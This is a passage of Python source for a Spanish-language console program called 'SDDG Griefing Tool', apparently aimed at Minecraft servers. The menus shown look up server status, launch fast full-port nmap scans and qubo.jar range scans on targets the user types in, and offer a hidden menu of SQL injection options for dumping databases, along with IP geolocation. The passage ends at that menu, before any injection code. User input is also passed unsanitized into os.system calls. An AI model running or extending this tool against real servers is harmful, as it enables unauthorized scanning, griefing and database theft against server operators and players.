        input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu ")
  elif menu=="8":
    
        os.system("cls || clear")
        sys.exit()
    
  elif menu=="5":
        
        os.system("title [SDDG Griefing Tool] SERVER STATUS")
        server = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}r{Fore.LIGHTGREEN_EX}v{Fore.LIGHTRED_EX}e{Fore.LIGHTGREEN_EX}r {Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}t{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}t{Fore.LIGHTRED_EX}u{Fore.LIGHTGREEN_EX}s{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}IP{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
        response = urllib.request.urlopen("https://api.mcsrvstat.us/2/" + str(server)).read().decode('utf-8')
        data = json.loads(response)
        try:
            Host = str(data['hostname'])
            ip = str(data['ip'])
            Port = str(data['port'])
            Motd = str(data['motd']['clean'][0].strip())
            players = str(data['players']['online'])
            playersm = str(data['players']['max'])
            Version = str(data['version'])
            Software = str(data['software'])
            Play =  players + "/" + playersm
            Play2 = Host + " " + f"(`{ip}`)"
            print("\n")
            print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}- {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}H{Fore.LIGHTGREEN_EX}O{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}T{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}"+Host + "(" + ip + ")")
            print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}- {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}P{Fore.LIGHTGREEN_EX}O{Fore.LIGHTRED_EX}R{Fore.LIGHTGREEN_EX}T{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}"+Port)
            print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}- {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}M{Fore.LIGHTGREEN_EX}O{Fore.LIGHTRED_EX}T{Fore.LIGHTGREEN_EX}D{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}"+Motd)
            print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}- {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}P{Fore.LIGHTGREEN_EX}L{Fore.LIGHTRED_EX}A{Fore.LIGHTGREEN_EX}Y{Fore.LIGHTRED_EX}E{Fore.LIGHTGREEN_EX}R{Fore.LIGHTRED_EX}S{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}"+Play)
            print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}- {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}V{Fore.LIGHTGREEN_EX}E{Fore.LIGHTRED_EX}R{Fore.LIGHTGREEN_EX}S{Fore.LIGHTRED_EX}I{Fore.LIGHTGREEN_EX}O{Fore.LIGHTRED_EX}N{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}"+Version)
            print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}- {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}O{Fore.LIGHTRED_EX}F{Fore.LIGHTGREEN_EX}T{Fore.LIGHTRED_EX}W{Fore.LIGHTGREEN_EX}A{Fore.LIGHTRED_EX}R{Fore.LIGHTGREEN_EX}E{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}"+Software)
            print("\n")
            input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu ")
        except:
            print("\n")
            print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}- {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}H{Fore.LIGHTGREEN_EX}O{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}T{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}"+Host + "(" + ip + ")")
            print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}- {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}P{Fore.LIGHTGREEN_EX}O{Fore.LIGHTRED_EX}R{Fore.LIGHTGREEN_EX}T{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}"+Port)
            print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}- {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}M{Fore.LIGHTGREEN_EX}O{Fore.LIGHTRED_EX}T{Fore.LIGHTGREEN_EX}D{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}"+Motd)
            print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}- {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}P{Fore.LIGHTGREEN_EX}L{Fore.LIGHTRED_EX}A{Fore.LIGHTGREEN_EX}Y{Fore.LIGHTRED_EX}E{Fore.LIGHTGREEN_EX}R{Fore.LIGHTRED_EX}S{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}"+Play)
            print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}- {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}V{Fore.LIGHTGREEN_EX}E{Fore.LIGHTRED_EX}R{Fore.LIGHTGREEN_EX}S{Fore.LIGHTRED_EX}I{Fore.LIGHTGREEN_EX}O{Fore.LIGHTRED_EX}N{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}"+Version)
            #print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}- {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}O{Fore.LIGHTRED_EX}F{Fore.LIGHTGREEN_EX}T{Fore.LIGHTRED_EX}W{Fore.LIGHTGREEN_EX}A{Fore.LIGHTRED_EX}R{Fore.LIGHTGREEN_EX}E{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}"+Software)
            print("\n")
            input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu")

  elif menu=="6":
      os.system("cls || clear")
      os.system("title [SDDG Griefing Tool] Nmap Scan")
      print(f"""
  {Fore.LIGHTCYAN_EX}╔══════════════════════════════════════════╗
  {Fore.LIGHTCYAN_EX}║                                          ║                                 
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}   ______{Fore.LIGHTGREEN_EX}   ______{Fore.LIGHTRED_EX}   ______{Fore.LIGHTGREEN_EX}      ______   {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} .' ____ \{Fore.LIGHTGREEN_EX} |_   _ `.{Fore.LIGHTRED_EX}|_   _ `.{Fore.LIGHTGREEN_EX}  .' ___  |  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} | (___ \_|{Fore.LIGHTGREEN_EX}  | | `. \{Fore.LIGHTRED_EX} | | `. \{Fore.LIGHTGREEN_EX}/ .'   \_|  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}  _.____`.{Fore.LIGHTGREEN_EX}   | |  | |{Fore.LIGHTRED_EX} | |  | |{Fore.LIGHTGREEN_EX}| |   ____  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} | \____) |{Fore.LIGHTGREEN_EX} _| |_.' /{Fore.LIGHTRED_EX}_| |_.' /{Fore.LIGHTGREEN_EX}\ `.___]  | {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}  \______.'{Fore.LIGHTGREEN_EX}|______.'{Fore.LIGHTRED_EX}|______.'{Fore.LIGHTGREEN_EX}  `._____.'  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║                                          ║ 
  {Fore.LIGHTCYAN_EX}║ {Fore.LIGHTGREEN_EX}Dev {Fore.LIGHTRED_EX}zGhosty    {Fore.LIGHTWHITE_EX}-       {Fore.LIGHTRED_EX}zGhosty#4370      {Fore.LIGHTCYAN_EX}║ 
  {Fore.LIGHTCYAN_EX}║ {Fore.LIGHTGREEN_EX}Dev {Fore.LIGHTRED_EX}Daiki      {Fore.LIGHTWHITE_EX}-       {Fore.LIGHTRED_EX}Daiki#4677        {Fore.LIGHTCYAN_EX}║ 
  {Fore.LIGHTCYAN_EX}╚══════════════════════════════════════════╝
  """)  
      print(f"  {Fore.LIGHTCYAN_EX}╔═══════════════════════════════╗")
      print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}1{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Escaneo Default       {Fore.LIGHTCYAN_EX}║")
      print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}2{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Escaneo Personalizado {Fore.LIGHTCYAN_EX}║")
      print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}3{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Volver                {Fore.LIGHTCYAN_EX}║")
      print(f"  {Fore.LIGHTCYAN_EX}╚═══════════════════════════════╝")
      print("\n")
      menu5=input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] ")
      if menu5=="1":
          target = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}m{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}p {Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}IP{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
          os.system(f"nmap -p 1-65535 -T5 -v -Pn {target}")
          print("\n")
          input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu ")
      elif menu5=="2":
          target = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}m{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}p {Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}IP{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
          porti = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}m{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}p {Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}PORT INICIAL{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
          portf = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}m{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}p {Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}PORT FINAL{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
          os.system(f"nmap -p {porti}-{portf} -T5 -v -Pn {target}")
          print("\n")
          input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu ")
          
  elif menu=="7":
      os.system("title [SDDG Griefing Tool] Quboscanner Range Scan")
      target = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}Q{Fore.LIGHTGREEN_EX}u{Fore.LIGHTRED_EX}b{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}s{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}r {Fore.LIGHTGREEN_EX}R{Fore.LIGHTRED_EX}a{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}g{Fore.LIGHTRED_EX}e {Fore.LIGHTGREEN_EX}S{Fore.LIGHTRED_EX}c{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}n{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}Range{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
      port = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}Q{Fore.LIGHTGREEN_EX}u{Fore.LIGHTRED_EX}b{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}s{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}r {Fore.LIGHTGREEN_EX}R{Fore.LIGHTRED_EX}a{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}g{Fore.LIGHTRED_EX}e {Fore.LIGHTGREEN_EX}S{Fore.LIGHTRED_EX}c{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}n{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}Ports{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
      Threadings = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}Q{Fore.LIGHTGREEN_EX}u{Fore.LIGHTRED_EX}b{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}s{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}r {Fore.LIGHTGREEN_EX}R{Fore.LIGHTRED_EX}a{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}g{Fore.LIGHTRED_EX}e {Fore.LIGHTGREEN_EX}S{Fore.LIGHTRED_EX}c{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}n{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}Threadings{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
      timeout = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}Q{Fore.LIGHTGREEN_EX}u{Fore.LIGHTRED_EX}b{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}s{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}r {Fore.LIGHTGREEN_EX}R{Fore.LIGHTRED_EX}a{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}g{Fore.LIGHTRED_EX}e {Fore.LIGHTGREEN_EX}S{Fore.LIGHTRED_EX}c{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}n{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}Time Out{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
      os.system(f"java -Dfile.encoding=UTF-8 -jar qubo.jar -range {target} -ports {port} -th {Threadings} -ti {timeout} -noping -fulloutput")
      print("\n")
      input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu ")

  elif menu=="9":
      os.system("cls || clear")
      os.system("title [SDDG Griefing Tool] Secret Options")
      print(f"""
  {Fore.LIGHTCYAN_EX}╔══════════════════════════════════════════╗                              
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}   ______{Fore.LIGHTGREEN_EX}   ______{Fore.LIGHTRED_EX}   ______{Fore.LIGHTGREEN_EX}      ______   {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} .' ____ \{Fore.LIGHTGREEN_EX} |_   _ `.{Fore.LIGHTRED_EX}|_   _ `.{Fore.LIGHTGREEN_EX}  .' ___  |  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} | (___ \_|{Fore.LIGHTGREEN_EX}  | | `. \{Fore.LIGHTRED_EX} | | `. \{Fore.LIGHTGREEN_EX}/ .'   \_|  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}  _.____`.{Fore.LIGHTGREEN_EX}   | |  | |{Fore.LIGHTRED_EX} | |  | |{Fore.LIGHTGREEN_EX}| |   ____  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} | \____) |{Fore.LIGHTGREEN_EX} _| |_.' /{Fore.LIGHTRED_EX}_| |_.' /{Fore.LIGHTGREEN_EX}\ `.___]  | {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}  \______.'{Fore.LIGHTGREEN_EX}|______.'{Fore.LIGHTRED_EX}|______.'{Fore.LIGHTGREEN_EX}  `._____.'  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║                                          ║ 
  {Fore.LIGHTCYAN_EX}║ {Fore.LIGHTGREEN_EX}Dev {Fore.LIGHTRED_EX}zGhosty    {Fore.LIGHTWHITE_EX}-       {Fore.LIGHTRED_EX}zGhosty#4370      {Fore.LIGHTCYAN_EX}║ 
  {Fore.LIGHTCYAN_EX}║ {Fore.LIGHTGREEN_EX}Dev {Fore.LIGHTRED_EX}Daiki      {Fore.LIGHTWHITE_EX}-       {Fore.LIGHTRED_EX}Daiki#4677        {Fore.LIGHTCYAN_EX}║ 
  {Fore.LIGHTCYAN_EX}╚══════════════════════════════════════════╝
      """)
      print(f"  {Fore.LIGHTCYAN_EX}╔════════════════════════════════════╗")
      print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}1{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}SQL Injection              {Fore.LIGHTCYAN_EX}║")
      print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}2{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}IPGeolocate                {Fore.LIGHTCYAN_EX}║")
      print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}3{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Buscar IPs En DB           {Fore.LIGHTCYAN_EX}║")
      print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}4{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Account Info               {Fore.LIGHTCYAN_EX}║")
      print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}5{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Leave                      {Fore.LIGHTCYAN_EX}║")
      print(f"  {Fore.LIGHTCYAN_EX}╚════════════════════════════════════╝")
      print("\n")
      menu2=input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] ")
      if menu2=="1":
          print("\n")
          os.system("title [SDDG Griefing Tool] SQL Injection")
          os.system("cls || clear")
          print(f"""
  {Fore.LIGHTCYAN_EX}╔══════════════════════════════════════════╗                              
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}   ______{Fore.LIGHTGREEN_EX}   ______{Fore.LIGHTRED_EX}   ______{Fore.LIGHTGREEN_EX}      ______   {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} .' ____ \{Fore.LIGHTGREEN_EX} |_   _ `.{Fore.LIGHTRED_EX}|_   _ `.{Fore.LIGHTGREEN_EX}  .' ___  |  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} | (___ \_|{Fore.LIGHTGREEN_EX}  | | `. \{Fore.LIGHTRED_EX} | | `. \{Fore.LIGHTGREEN_EX}/ .'   \_|  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}  _.____`.{Fore.LIGHTGREEN_EX}   | |  | |{Fore.LIGHTRED_EX} | |  | |{Fore.LIGHTGREEN_EX}| |   ____  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} | \____) |{Fore.LIGHTGREEN_EX} _| |_.' /{Fore.LIGHTRED_EX}_| |_.' /{Fore.LIGHTGREEN_EX}\ `.___]  | {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}  \______.'{Fore.LIGHTGREEN_EX}|______.'{Fore.LIGHTRED_EX}|______.'{Fore.LIGHTGREEN_EX}  `._____.'  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║                                          ║ 
  {Fore.LIGHTCYAN_EX}║ {Fore.LIGHTGREEN_EX}Dev {Fore.LIGHTRED_EX}zGhosty    {Fore.LIGHTWHITE_EX}-       {Fore.LIGHTRED_EX}zGhosty#4370      {Fore.LIGHTCYAN_EX}║ 
  {Fore.LIGHTCYAN_EX}║ {Fore.LIGHTGREEN_EX}Dev {Fore.LIGHTRED_EX}Daiki      {Fore.LIGHTWHITE_EX}-       {Fore.LIGHTRED_EX}Daiki#4677        {Fore.LIGHTCYAN_EX}║ 
  {Fore.LIGHTCYAN_EX}╚══════════════════════════════════════════╝
          """)
          print(f"  {Fore.LIGHTCYAN_EX}╔════════════════════════════════════╗")
          print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}1{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Sacar DB                   {Fore.LIGHTCYAN_EX}║")
          print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}2{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Acceder al DB/tables       {Fore.LIGHTCYAN_EX}║")
          print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}3{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Acceder a las columnas     {Fore.LIGHTCYAN_EX}║")
          print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}4{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Dumpear DB                 {Fore.LIGHTCYAN_EX}║")
          print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}5{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Leave                      {Fore.LIGHTCYAN_EX}║")
